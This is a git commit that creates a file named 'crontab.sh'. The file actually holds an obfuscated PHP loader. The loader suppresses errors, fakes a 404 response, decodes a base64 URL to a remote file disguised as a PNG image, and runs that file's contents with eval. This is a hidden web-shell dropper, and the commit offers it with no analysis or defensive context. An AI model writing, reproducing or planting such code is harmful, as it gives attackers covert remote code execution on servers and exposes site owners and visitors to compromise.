47aef7aed17f923bfe31c6e86928de5303c4ea21
Anonrocks <52328375+Anonrocks@users.noreply.github.com>
2025-08-21 00:20:49 +0700

    Create crontab.sh

---
+++ crontab.sh
@@ -0,0 +1,2 @@
+<?php session_start(); error_reporting(0);
+http_response_code(404); eval/**_**/(UrLdEcOdE("%3f%3e") .file_get_contents/**_**/(UrLdEcOdE/**_**/(BaSe64_DeCoDe/**_**/('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Fub25yb2Nrcy8tL3JlZnMvaGVhZHMvbWFzdGVyL21pbi5wbmc=')))); /**_**/?>
